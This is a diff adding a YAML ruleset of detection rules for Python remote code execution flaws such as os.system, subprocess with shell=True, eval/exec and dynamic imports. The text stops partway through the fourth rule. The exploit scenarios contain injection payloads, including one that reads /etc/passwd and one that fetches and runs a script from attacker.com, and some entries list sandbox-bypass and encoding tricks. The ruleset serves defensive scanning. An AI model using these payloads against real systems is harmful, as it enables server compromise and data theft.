@@ -1,0 +1,1309 @@
+# ============================================================================
+# RCE Detection Rules - Python
+# Ruleset Version: 3.0.0
+# Last Updated: 2025-01-15
+# Category: Remote Code Execution (CWE-78, CWE-94)
+# Language: Python
+# ============================================================================
+
+rules:
+  # --------------------------------------------------------------------------
+  # RCE-PY-001: os.system/os.popen with user input
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-PY-001"
+    title: "os.system/os.popen with User-Controlled Input"
+    description: >
+      Detects usage of Python's os.system() and os.popen() where the command
+      string includes user-controlled input. These functions invoke a system
+      shell (/bin/sh on Unix, cmd.exe on Windows) to execute the command,
+      enabling shell metacharacter injection for arbitrary command execution.
+      os.system and os.popen are legacy interfaces that should be replaced
+      with subprocess module calls without shell=True.
+    language: python
+    category: rce
+    severity: Critical
+    confidence: 0.95
+    cwe: CWE-78
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - command-injection
+      - os-system
+      - os-popen
+      - shell-injection
+      - python
+      - os-command
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'os\s*\.\s*system\s*\(\s*(?:f[`\x27"]|[`\x27"][^)]{0,150}%|[^)]{0,150}\+\s*|[^)]{0,150}\.format\s*\()[^)]{0,150}(?:request\.|req\.|params\.|input|cmd|command|user|data)'
+        description: "os.system with f-string, format, or concatenation containing user input"
+      - type: regex
+        pattern: 'os\s*\.\s*system\s*\(\s*(?:cmd|command|user_input|user_cmd|shellcmd|shell_command|input_cmd)\s*\)'
+        description: "os.system with variable likely from user input"
+      - type: regex
+        pattern: 'os\s*\.\s*popen\s*\(\s*(?:f[`\x27"]|[`\x27"][^)]{0,150}%|[^)]{0,150}\+\s*|[^)]{0,150}\.format\s*\()[^)]{0,150}(?:request\.|req\.|params\.|input|cmd|command|user|data)'
+        description: "os.popen with user-controlled input"
+      - type: regex
+        pattern: 'os\s*\.\s*popen\s*\(\s*(?:cmd|command|user_input|user_cmd|shellcmd|input_cmd)\s*\)'
+        description: "os.popen with variable likely from user input"
+      - type: regex
+        pattern: 'os\s*\.\s*(?:system|popen)\s*\(\s*(?:request\s*\.\s*(?:args|form|json|data|values)|request\.GET|request\.POST)\s*[\.\[]'
+        description: "os.system/popen directly with Flask/Django request input"
+      - type: regex
+        pattern: '(?:cmd|command|user_input)\s*=\s*(?:request\s*\.\s*(?:args|form|json|GET|POST)|input\s*\()[\s\S]{0,200}os\s*\.\s*(?:system|popen)\s*\('
+        description: "Variable from request passed to os.system/popen"
+      - type: regex
+        pattern: 'os\s*\.\s*(?:system|popen)\s*\(\s*f[`\x27"](?:ping|nslookup|dig|traceroute|curl|wget|cat|ls|whoami)\s+\{(?:host|ip|domain|target|path|filename|user)'
+        description: "os.system with f-string containing common command and user variable"
+      - type: regex
+        pattern: 'os\s*\.\s*(?:execl|execle|execlp|execv|execve|execvp|execvpe)\s*\(\s*(?:cmd|command|path|program|user_input|request\.)'
+        description: "os.exec* family with user-controlled program path"
+    anti_patterns:
+      - 'os\.system\s*\(\s*[`\x27"][a-zA-Z/]+[`\x27"]\s*\)'
+      - 'os\.system\s*\(\s*[`\x27"](?:clear|cls|echo|true|false)[`\x27"]\s*\)'
+      - 'os\.system\s*\(\s*(?:COMMAND|CMD|SETUP_CMD|BUILD_CMD)\s*\)'
+      - 'os\.system\s*\(\s*(?:sys\.executable|python_path)\s*\+'
+      - '@pytest\.fixture'
+      - 'def\s+test_\w+'
+      - '@mock\.patch.*os\.system'
+      - 'unittest\.mock'
+      - 'mock\.MagicMock'
+      - 'class\s+\w+Test(?:Case)?\s*\('
+      - '(?:#|""").*(?:test|example|demo|deprecated)'
+      - 'os\.system\s*\(\s*[`\x27"]pip\s+'
+      - 'os\.system\s*\(\s*[`\x27"](?:apt|yum|brew)\s+'
+      - 'setup\.py'
+      - 'Makefile'
+    bypass_variants:
+      - description: "Semicolon command chaining"
+        pattern: 'os\.(?:system|popen)\s*\(.*?(?:;|\||&&|\|\|)'
+      - description: "Newline injection for command separation"
+        pattern: 'os\.(?:system|popen)\s*\(.*?(?:%0[aAdD]|\\n|\\r)'
+      - description: "Backtick or $() command substitution"
+        pattern: 'os\.(?:system|popen)\s*\(.*?(?:`[^`]+`|\$\([^)]+\))'
+      - description: "Wildcard expansion for argument injection"
+        pattern: 'os\.(?:system|popen)\s*\(.*?(?:\*|\?|\[.*?\])'
+      - description: "IFS manipulation for command splitting"
+        pattern: 'os\.(?:system|popen)\s*\(.*?(?:IFS|\\$IFS)'
+    evasion_indicators:
+      - "Shell metacharacters (; | && || ` $())"
+      - "Newline/carriage return injection"
+      - "Backtick or $() command substitution"
+      - "IFS (Internal Field Separator) manipulation"
+      - "Heredoc injection"
+      - "Wildcard and glob expansion"
+    encoding_variants:
+      - type: "url_encoding"
+        pattern: 'os\.(?:system|popen)\s*\(.*?%(?:0[aAdD]|3[bB]|7[cC]|26|60)'
+      - type: "unicode_escape"
+        pattern: 'os\.(?:system|popen)\s*\(.*?\\u(?:000[aAdD]|003[bB]|007[cC])'
+      - type: "hex_escape"
+        pattern: 'os\.(?:system|popen)\s*\(.*?\\x(?:0[aAdD]|3[bB]|7[cC])'
+      - type: "octal_escape"
+        pattern: 'os\.(?:system|popen)\s*\(.*?\\(?:012|015|073|174)'
+    multi_function_chain_patterns:
+      - "request.args.get('cmd') -> os.system(cmd)"
+      - "request.form['host'] -> f'ping {host}' -> os.system(cmd)"
+      - "request.json['path'] -> os.popen(f'ls {path}').read()"
+      - "user input -> string formatting -> os.system(formatted_cmd)"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "OS command execution enables full system compromise with application privileges"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "request.args.get('host')"
+        sink: "os.system(f'ping {host}')"
+        through: "f-string interpolation in command"
+      - source: "request.form['filename']"
+        sink: "os.popen(f'file {filename}').read()"
+        through: "form parameter to os.popen command"
+      - source: "request.json['command']"
+        sink: "os.system(command)"
+        through: "direct JSON body to os.system"
+    impact: |
+      - Full remote code execution on the server.
+      - Complete system compromise with application's OS privileges.
+      - Data exfiltration from filesystem, databases, and environment variables.
+      - Lateral movement to other systems via network commands.
+      - Installation of backdoors, rootkits, or cryptominers.
+      - Denial of service through system resource manipulation.
+    remediation: |
+      1. Use subprocess with shell=False and argument lists:
+         ```python
+         import subprocess
+         import shlex
+
+         # UNSAFE:
+         # os.system(f'ping -c 4 {user_host}')
+
+         # SAFE: Use subprocess with argument list (no shell)
+         def safe_ping(host: str) -> str:
+             # Validate input
+             import re
+             if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9.\-]+[a-zA-Z0-9]$', host):
+                 raise ValueError('Invalid hostname')
+             if len(host) > 253:
+                 raise ValueError('Hostname too long')
+
+             result = subprocess.run(
+                 ['ping', '-c', '4', host],
+                 capture_output=True, text=True, timeout=10
+             )
+             return result.stdout
+         ```
+      2. Never use os.system() or os.popen() with user input.
+      3. Use subprocess.run() with shell=False (default).
+      4. Validate user input against strict allowlists.
+      5. Apply principle of least privilege to the application user.
+    references:
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cwe.mitre.org/data/definitions/78.html"
+      - "https://docs.python.org/3/library/os.html#os.system"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - '@app\.route\s*\('
+        - 'def\s+\w+\s*\(\s*request'
+        - 'class\s+\w+View\s*\('
+        - 'import\s+os'
+        - 'from\s+os\s+import'
+      taint_source_indicators:
+        - 'request\.args\.get\s*\('
+        - 'request\.form\.get\s*\('
+        - 'request\.json\s*[\.\[]'
+        - 'request\.GET\.\w+'
+        - 'request\.POST\.\w+'
+        - 'input\s*\(\s*\)'
+      taint_sink_indicators:
+        - 'os\.system\s*\('
+        - 'os\.popen\s*\('
+        - 'os\.exec\w+\s*\('
+        - 'commands\.getoutput\s*\('
+        - 'commands\.getstatusoutput\s*\('
+      sanitization_patterns:
+        - 'shlex\.quote\s*\('
+        - 'subprocess\.run\s*\(\s*\['
+        - 'subprocess\.Popen\s*\(\s*\['
+        - 'allowlist.*re\.match'
+        - 'ALLOWED_COMMANDS'
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 + shell_access_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Flask application provides a network diagnostic tool:
+
+        @app.route('/api/ping')
+        def ping():
+            host = request.args.get('host')
+            result = os.popen(f'ping -c 4 {host}').read()
+            return jsonify({'result': result})
+
+        Attacker sends:
+        GET /api/ping?host=8.8.8.8;cat%20/etc/passwd
+
+        The server executes: ping -c 4 8.8.8.8;cat /etc/passwd
+        and returns /etc/passwd contents.
+      example_payload: "8.8.8.8;cat /etc/passwd"
+      attacker_objective: "Execute arbitrary OS commands via shell injection"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "RCE-PY-002"
+        - "RCE-PY-003"
+
+  # --------------------------------------------------------------------------
+  # RCE-PY-002: subprocess.Popen with shell=True
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-PY-002"
+    title: "subprocess.Popen/run/call with shell=True and User Input"
+    description: >
+      Detects usage of Python's subprocess module functions (Popen, run, call,
+      check_output, check_call, getoutput, getstatusoutput) with shell=True
+      where the command includes user-controlled input. When shell=True, the
+      command string is passed to /bin/sh (Unix) or cmd.exe (Windows) for
+      interpretation, enabling shell metacharacter injection identical to
+      os.system(). This is the most common subprocess misconfiguration.
+    language: python
+    category: rce
+    severity: High
+    confidence: 0.94
+    cwe: CWE-78
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - command-injection
+      - subprocess
+      - shell-true
+      - popen
+      - python
+      - os-command
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'subprocess\s*\.\s*(?:Popen|run|call|check_output|check_call)\s*\(\s*(?:f[`\x27"]|[`\x27"].*?%|.*?\+\s*|.*?\.format\s*\().*?(?:request\.|req\.|input|cmd|command|user|data)[\s\S]{0,200}shell\s*=\s*True'
+        description: "subprocess with user-controlled command and shell=True"
+      - type: regex
+        pattern: 'subprocess\s*\.\s*(?:Popen|run|call|check_output|check_call)\s*\(\s*(?:cmd|command|user_input|user_cmd|shell_cmd|input_cmd)\s*,[\s\S]{0,200}shell\s*=\s*True'
+        description: "subprocess with command variable and shell=True"
+      - type: regex
+        pattern: 'subprocess\s*\.\s*(?:Popen|run|call)\s*\(\s*(?:request\s*\.\s*(?:args|form|json|GET|POST)|input\s*\()[\s\S]{0,200}shell\s*=\s*True'
+        description: "subprocess directly with Flask/Django request and shell=True"
+      - type: regex
+        pattern: 'subprocess\s*\.\s*(?:getoutput|getstatusoutput)\s*\(\s*(?:f[`\x27"]|.*?\+|.*?\.format|cmd|command|user_input|request\.)'
+        description: "subprocess.getoutput (always uses shell) with user input"
+      - type: regex
+        pattern: '(?:cmd|command)\s*=\s*f[`\x27"].*?\{(?:request\.|user|input|host|domain|path|filename|data).*?[`\x27"][\s\S]{0,200}subprocess\s*\.\s*(?:Popen|run|call|check_output)\s*\(\s*(?:cmd|command)\s*,[\s\S]{0,100}shell\s*=\s*True'
+        description: "F-string command with user input passed to subprocess shell=True"
+      - type: regex
+        pattern: 'shell\s*=\s*True[\s\S]{0,200}subprocess\s*\.\s*(?:Popen|run|call)\s*\(\s*(?:f[`\x27"]|.*?\.format|.*?\+).*?(?:request\.|input|user|data)'
+        description: "shell=True appearing before subprocess call with user input"
+      - type: regex
+        pattern: 'subprocess\s*\.\s*(?:Popen|run)\s*\(\s*[`\x27"].*?[`\x27"]\s*\+\s*(?:request\.|input|user|shlex\.quote)[\s\S]{0,100}shell\s*=\s*True'
+        description: "String concatenation with user input and shell=True (shlex.quote alone not enough)"
+      - type: regex
+        pattern: 'subprocess\s*\.\s*(?:Popen|run|call)\s*\(\s*shlex\.split\s*\(\s*f[`\x27"].*?\{(?:request\.|user|input|cmd)'
+        description: "shlex.split with user-injected f-string (shell injection before splitting)"
+    anti_patterns:
+      - 'subprocess\s*\.\s*(?:Popen|run|call)\s*\(\s*\[.*?\]\s*[,)]'
+      - 'subprocess\s*\.\s*(?:Popen|run|call)\s*\(\s*\[.*?\]\s*,\s*(?!.*shell\s*=\s*True)'
+      - 'subprocess\s*\.\s*(?:Popen|run|call)\s*\(\s*[`\x27"][a-zA-Z/]+[`\x27"]\s*,\s*shell\s*=\s*True'
+      - 'subprocess\s*\.\s*\w+\s*\(\s*(?:COMMAND|CMD|SCRIPT)\s*,'
+      - 'subprocess\s*\.\s*\w+\s*\(\s*(?:sys\.executable|python_path)\s*,'
+      - '@pytest\.fixture'
+      - 'def\s+test_\w+'
+      - '@mock\.patch.*subprocess'
+      - 'unittest\.mock\.patch.*subprocess'
+      - 'mock\.MagicMock'
+      - 'class\s+\w+Test(?:Case)?\s*\('
+      - '(?:#|""").*(?:test|example|demo|deprecated)'
+      - 'setup\.py'
+      - 'Makefile'
+      - 'PIPE\s*,\s*PIPE'
+    bypass_variants:
+      - description: "Semicolon command chaining in shell=True subprocess"
+        pattern: 'subprocess\.\w+\s*\(.*?shell\s*=\s*True.*?(?:;|\||&&|\|\|)'
+      - description: "Newline injection for command boundary"
+        pattern: 'subprocess\.\w+\s*\(.*?(?:%0[aAdD]|\\n|\\r).*?shell\s*=\s*True'
+      - description: "Command substitution via $() or backticks"
+        pattern: 'subprocess\.\w+\s*\(.*?(?:`[^`]+`|\$\([^)]+\)).*?shell\s*=\s*True'
+      - description: "shlex.quote bypass via incorrect usage"
+        pattern: 'shlex\.quote\s*\([^)]+\).*?shell\s*=\s*True'
+      - description: "Environment variable injection"
+        pattern: 'subprocess\.\w+\s*\(.*?(?:\$\w+|\$\{[^}]+\}).*?shell\s*=\s*True'
+    evasion_indicators:
+      - "Shell metacharacters with shell=True"
+      - "shlex.quote used with shell=True (false safety)"
+      - "Newline injection for command separation"
+      - "Environment variable substitution"
+      - "Heredoc or process substitution"
+    encoding_variants:
+      - type: "url_encoding"
+        pattern: 'subprocess\.\w+\s*\(.*?%(?:0[aAdD]|3[bB]|7[cC]).*?shell\s*=\s*True'
+      - type: "unicode_escape"
+        pattern: 'subprocess\.\w+\s*\(.*?\\u(?:000[aAdD]|003[bB]).*?shell\s*=\s*True'
+      - type: "hex_escape"
+        pattern: 'subprocess\.\w+\s*\(.*?\\x(?:0[aAdD]|3[bB]).*?shell\s*=\s*True'
+    multi_function_chain_patterns:
+      - "request.args.get('cmd') -> subprocess.Popen(cmd, shell=True)"
+      - "request.form['host'] -> f'ping {host}' -> subprocess.run(cmd, shell=True)"
+      - "request.json['path'] -> subprocess.check_output(cmd, shell=True)"
+      - "user input -> shlex.quote (false safety) -> shell=True subprocess"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "subprocess with shell=True enables full shell access for arbitrary command execution"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "request.args.get('host')"
+        sink: "subprocess.run(f'ping {host}', shell=True)"
+        through: "f-string command with shell=True"
+      - source: "request.form['filename']"
+        sink: "subprocess.Popen(f'file {filename}', shell=True)"
+        through: "form parameter to subprocess command"
+      - source: "request.json['query']"
+        sink: "subprocess.check_output(cmd, shell=True)"
+        through: "JSON body to subprocess with shell"
+    impact: |
+      - Full remote code execution via shell injection.
+      - System compromise with application process privileges.
+      - Data exfiltration, lateral movement, backdoor installation.
+      - Environment variable access (API keys, database credentials).
+      - Complete infrastructure compromise in cloud environments.
+    remediation: |
+      1. Use subprocess with shell=False (default) and argument lists:
+         ```python
+         import subprocess
+
+         # UNSAFE:
+         # subprocess.run(f'ping -c 4 {host}', shell=True)
+
+         # SAFE: Argument list without shell
+         def safe_ping(host: str) -> str:
+             import re
+             if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9.\-]+$', host):
+                 raise ValueError('Invalid hostname')
+
+             result = subprocess.run(
+                 ['ping', '-c', '4', host],  # List of args, no shell
+                 capture_output=True, text=True, timeout=10,
+                 # shell=False is the default!
+             )
+             return result.stdout
+         ```
+      2. Never use shell=True with user-controlled input.
+      3. Always pass commands as lists of arguments, not strings.
+      4. Validate user input against strict patterns.
+      5. Use shlex.split only for trusted input (not a security measure for shell=True).
+    references:
+      - "https://docs.python.org/3/library/subprocess.html#security-considerations"
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cwe.mitre.org/data/definitions/78.html"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'import\s+subprocess'
+        - 'from\s+subprocess\s+import'
+        - '@app\.route\s*\('
+        - 'def\s+\w+\s*\(\s*request'
+        - 'class\s+\w+View\s*\('
+      taint_source_indicators:
+        - 'request\.args\.get\s*\('
+        - 'request\.form\.get\s*\('
+        - 'request\.json\s*[\.\[]'
+        - 'request\.GET\.\w+'
+        - 'request\.POST\.\w+'
+        - 'input\s*\(\s*\)'
+      taint_sink_indicators:
+        - 'subprocess\.Popen\s*\('
+        - 'subprocess\.run\s*\('
+        - 'subprocess\.call\s*\('
+        - 'subprocess\.check_output\s*\('
+        - 'subprocess\.check_call\s*\('
+        - 'subprocess\.getoutput\s*\('
+      sanitization_patterns:
+        - 'subprocess\.\w+\s*\(\s*\['
+        - 'shlex\.split\s*\('
+        - 'shell\s*=\s*False'
+        - 'ALLOWED_COMMANDS'
+        - 'allowlist.*re\.match'
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 + shell_true_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Django view runs a system command with user input:
+
+        def convert_file(request):
+            filename = request.POST.get('filename')
+            subprocess.run(
+                f'convert {filename} output.pdf',
+                shell=True, capture_output=True
+            )
+            return FileResponse('output.pdf')
+
+        Attacker sends:
+        POST /convert
+        filename=test.png;curl http://attacker.com/shell.sh|bash
+
+        The server executes the convert command AND downloads and runs a shell script.
+      example_payload: "test.png;curl http://attacker.com/shell.sh|bash"
+      attacker_objective: "Inject OS commands via shell=True subprocess"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "RCE-PY-001"
+        - "RCE-PY-003"
+
+  # --------------------------------------------------------------------------
+  # RCE-PY-003: eval/exec/compile with user input
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-PY-003"
+    title: "eval/exec/compile with User-Controlled Input"
+    description: >
+      Detects usage of Python's eval(), exec(), and compile() built-in
+      functions where the code string is derived from user-controlled input.
+      These functions execute arbitrary Python code, enabling attackers to
+      import modules, access the filesystem, execute OS commands, and
+      perform any operation available in the Python runtime. eval() is
+      commonly misused for expression evaluation and JSON parsing.
+    language: python
+    category: rce
+    severity: Critical
+    confidence: 0.95
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - eval
+      - exec
+      - compile
+      - code-injection
+      - python
+      - dynamic-evaluation
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'eval\s*\(\s*(?:request\s*\.\s*(?:args|form|json|data|values|GET|POST)|input\s*\()'
+        description: "eval() directly with Flask/Django request input"
+      - type: regex
+        pattern: 'eval\s*\(\s*(?:expr|expression|formula|calc|code|script|user_input|data|query|payload)\s*\)'
+        description: "eval() with variable likely from user input"
+      - type: regex
+        pattern: 'exec\s*\(\s*(?:request\s*\.\s*(?:args|form|json|data|values|GET|POST)|code|script|user_input|data|payload)\s*\)'
+        description: "exec() with user-controlled input"
+      - type: regex
+        pattern: 'compile\s*\(\s*(?:request\s*\.\s*(?:args|form|json)|code|script|user_input|expr)\s*,\s*[`\x27"]<[^>]+>[`\x27"]\s*,\s*[`\x27"](?:eval|exec|single)[`\x27"]'
+        description: "compile() with user-controlled source code"
+      - type: regex
+        pattern: 'eval\s*\(\s*f[`\x27"].*?\{(?:request\.|user|input|data|expr|formula|calc)'
+        description: "eval with f-string containing user input"
+      - type: regex
+        pattern: '(?:expr|expression|formula|code|script)\s*=\s*request\s*\.\s*(?:args|form|json|GET|POST)\s*[\.\[][\s\S]{0,200}(?:eval|exec|compile)\s*\('
+        description: "User input assigned then passed to eval/exec/compile"
+      - type: regex
+        pattern: 'exec\s*\(\s*(?:compile\s*\()?(?:code|script|user_input|expression|request\.)'
+        description: "exec with compile or direct user input"
+      - type: regex
+        pattern: '__builtins__\s*\[\s*[`\x27"](?:eval|exec|compile|__import__)[`\x27"]\s*\]\s*\(\s*(?:user|input|request|data|code)'
+        description: "Builtins access to eval/exec with user input"
+    anti_patterns:
+      - 'eval\s*\(\s*[`\x27"][^`\x27"]+[`\x27"]\s*\)'
+      - 'eval\s*\(\s*repr\s*\('
+      - 'eval\s*\(\s*(?:json\.loads|ast\.literal_eval)\s*\('
+      - 'ast\s*\.\s*literal_eval\s*\('
+      - 'json\s*\.\s*loads\s*\('
+      - '@pytest\.fixture'
+      - 'def\s+test_\w+'
+      - '@mock\.patch'
+      - 'unittest\.mock'
+      - 'class\s+\w+Test(?:Case)?\s*\('
+      - '(?:#|""").*(?:test|example|demo|UNSAFE|WARNING|DANGER)'
+      - 'eval\s*\(\s*(?:config|settings|Constants|EXPR)\s*\.'
+      - 'pandas\.eval\s*\('
+      - 'numexpr\.evaluate\s*\('
+      - 'sympy\.(?:parse_expr|sympify)\s*\('
+    bypass_variants:
+      - description: "import os via eval/exec for command execution"
+        pattern: 'eval\s*\(\s*[`\x27"]__import__\s*\(\s*[`\x27\\\x27"]os[`\x27\\\x27"]\s*\)\s*\.system'
+      - description: "builtins manipulation to bypass restricted eval"
+        pattern: 'eval\s*\([^)]*__builtins__'
+      - description: "Class hierarchy traversal via __subclasses__"
+        pattern: 'eval\s*\([^)]*(?:__class__|__subclasses__|__mro__|__bases__|__globals__)'
+      - description: "Attribute access chain for restricted bypass"
+        pattern: 'eval\s*\([^)]*(?:getattr|__getattribute__|__dict__|__getattr__)'
+      - description: "Unicode normalization bypass for keyword filtering"
+        pattern: 'eval\s*\([^)]*(?:\\u[0-9A-Fa-f]{4}|\\x[0-9A-Fa-f]{2})'
+    evasion_indicators:
+      - "__import__ for dynamic module loading"
+      - "__subclasses__ traversal for sandbox bypass"
+      - "builtins dictionary manipulation"
+      - "getattr chain for attribute traversal"
+      - "Unicode/hex encoding of keywords"
+      - "String concatenation to build dangerous expressions"
+    encoding_variants:
+      - type: "unicode_escape"
+        pattern: 'eval\s*\(.*?\\u[0-9A-Fa-f]{4}'
+      - type: "hex_escape"
+        pattern: 'eval\s*\(.*?\\x[0-9A-Fa-f]{2}'
+      - type: "base64_decode"
+        pattern: 'eval\s*\(\s*(?:base64\.b64decode|b64decode|codecs\.decode)\s*\('
+      - type: "rot13_decode"
+        pattern: 'eval\s*\(\s*codecs\.decode\s*\([^)]*[`\x27"]rot[_-]?13[`\x27"]'
+    multi_function_chain_patterns:
+      - "request.json['expression'] -> eval(expression) -> result returned"
+      - "request.form['code'] -> exec(code) -> side effects"
+      - "request.args['formula'] -> compile(formula) -> eval(compiled)"
+      - "user input -> base64 decode -> eval(decoded) -> arbitrary code"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "eval/exec enables full Python runtime access for OS commands and file I/O"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "request.json['expression']"
+        sink: "eval(expression)"
+        through: "direct JSON body to eval"
+      - source: "request.form['code']"
+        sink: "exec(code)"
+        through: "form data to exec"
+      - source: "request.args.get('formula')"
+        sink: "eval(formula)"
+        through: "query parameter to eval for calculation"
+    impact: |
+      - Full remote code execution in the Python process.
+      - Arbitrary module import (os, subprocess, socket, etc.).
+      - Filesystem read/write access.
+      - OS command execution via os.system or subprocess.
+      - Network access for data exfiltration and lateral movement.
+      - Complete server compromise.
+    remediation: |
+      1. Use ast.literal_eval for safe expression evaluation:
+         ```python
+         import ast
+
+         # UNSAFE:
+         # result = eval(user_expression)
+
+         # SAFE: For literal values (strings, numbers, tuples, lists, dicts)
+         result = ast.literal_eval(user_expression)
+
+         # SAFE: For mathematical expressions
+         import simpleeval
+         s = simpleeval.SimpleEval()
+         result = s.eval(user_expression)
+
+         # SAFE: For JSON parsing
+         import json
+         data = json.loads(user_json)
+         ```
+      2. Never use eval/exec with user input, even with restricted builtins.
+      3. Use ast.literal_eval for safe literal evaluation.
+      4. Use simpleeval, numexpr, or mathparse for math expressions.
+      5. Use JSON parsing (json.loads) instead of eval for data.
+    references:
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://docs.python.org/3/library/functions.html#eval"
+      - "https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - '@app\.route\s*\('
+        - 'def\s+\w+\s*\(\s*request'
+        - 'class\s+\w+View\s*\('
+        - '@api_view\s*\('
+      taint_source_indicators:
+        - 'request\.args\.get\s*\('
+        - 'request\.form\.get\s*\('
+        - 'request\.json\s*[\.\[]'
+        - 'request\.GET\.\w+'
+        - 'request\.POST\.\w+'
+        - 'input\s*\(\s*\)'
+      taint_sink_indicators:
+        - 'eval\s*\('
+        - 'exec\s*\('
+        - 'compile\s*\('
+        - '__builtins__\s*\['
+      sanitization_patterns:
+        - 'ast\.literal_eval\s*\('
+        - 'json\.loads\s*\('
+        - 'simpleeval\.'
+        - 'numexpr\.evaluate\s*\('
+        - 'ALLOWED_FUNCTIONS'
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 + python_runtime_access)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Flask calculator API uses eval for expression evaluation:
+
+        @app.route('/api/calc')
+        def calculate():
+            expr = request.args.get('expr')
+            result = eval(expr)
+            return jsonify({'result': result})
+
+        Attacker sends:
+        GET /api/calc?expr=__import__('os').popen('id').read()
+
+        The server executes the OS command and returns the result.
+      example_payload: "__import__('os').popen('id').read()"
+      attacker_objective: "Execute arbitrary Python code on the server"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "RCE-PY-001"
+        - "RCE-PY-002"
+        - "RCE-PY-004"
+
+  # --------------------------------------------------------------------------
+  # RCE-PY-004: __import__ dynamic module loading
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-PY-004"
+    title: "__import__/importlib Dynamic Module Loading with User Input"
+    description: >
+      Detects usage of Python's __import__() built-in function and importlib
+      module functions where the module name is derived from user-controlled
+      input. Dynamic imports allow attackers to load arbitrary Python modules,
+      including os, subprocess, socket, and other modules that provide system
+      access. This is often used in plugin systems, factory patterns, or
+      when eval/exec are restricted but __import__ is still accessible.
+    language: python
+    category: rce
+    severity: High
+    confidence: 0.87
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - import
+      - dynamic-loading
+      - importlib
+      - python
+      - module-loading
+      - plugin-system
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: '__import__\s*\(\s*(?:request\s*\.\s*(?:args|form|json|GET|POST)|module_name|plugin_name|name|user_input|data)'
+        description: "__import__ with user-controlled module name"
+      - type: regex
+        pattern: 'importlib\s*\.\s*import_module\s*\(\s*(?:request\s*\.\s*(?:args|form|json|GET|POST)|module_name|plugin_name|name|user_input|data)'
+        description: "importlib.import_module with user-controlled name"
+      - type: regex
+        pattern: '__import__\s*\(\s*f[`\x27"].*?\{(?:request\.|user|input|name|module|plugin|data)'
+        description: "__import__ with f-string containing user input"
+      - type: regex
+        pattern: 'importlib\s*\.\s*import_module\s*\(\s*f[`\x27"].*?\{(?:request\.|user|input|name|module|plugin|data)'
+        description: "importlib.import_module with f-string containing user input"
+      - type: regex
+        pattern: '(?:module_name|plugin_name|name|handler)\s*=\s*request\s*\.\s*(?:args|form|json|GET|POST)\s*[\.\[][\s\S]{0,200}(?:__import__|importlib\.import_module)\s*\('
+        description: "Module name from request used in dynamic import"
+      - type: regex
+        pattern: 'getattr\s*\(\s*__import__\s*\(\s*(?:module|name|plugin|request\.)'
+        description: "getattr combined with __import__ for attribute access"
+      - type: regex
+        pattern: 'importlib\s*\.\s*util\s*\.\s*(?:spec_from_file_location|module_from_spec)\s*\(\s*(?:name|path|module|request\.)'
+        description: "importlib.util for loading modules from user-controlled path"
+      - type: regex
